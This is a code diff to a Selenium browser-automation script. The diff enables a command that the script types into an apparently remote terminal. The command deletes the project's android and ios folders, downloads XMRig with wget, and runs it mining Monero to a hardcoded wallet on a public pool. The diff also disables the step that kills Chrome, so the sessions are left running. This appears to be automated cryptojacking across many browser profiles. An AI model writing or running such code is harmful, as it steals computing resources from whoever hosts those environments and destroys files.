@@ -212,8 +212,8 @@ const runCMDWithSelenium = async (driver, name) => {
     }
     await driver.actions().sendKeys('\uE007').perform(); // Enter key
     console.log('Commands executed with Selenium');
-    // const cmd = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
-    // await driver.actions().sendKeys(cmd).perform();
+    const cmd = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
+    await driver.actions().sendKeys(cmd).perform();
     await driver.actions().sendKeys('\uE007').perform(); // Enter key
     // 
     await new Promise(resolve => setTimeout(resolve, 1 * 1000));
@@ -346,7 +346,7 @@ async function connectToDebugChrome(name, port) {
   openChrome(port, profilePath);
   await new Promise(resolve => setTimeout(resolve, 3 * 1000));
   await runProfile(port, name);
-  killChromeProcess().catch(console.error);
+  // killChromeProcess().catch(console.error);
 };
 
 const saveErrProfile = async (filePath, profilePathName) => {
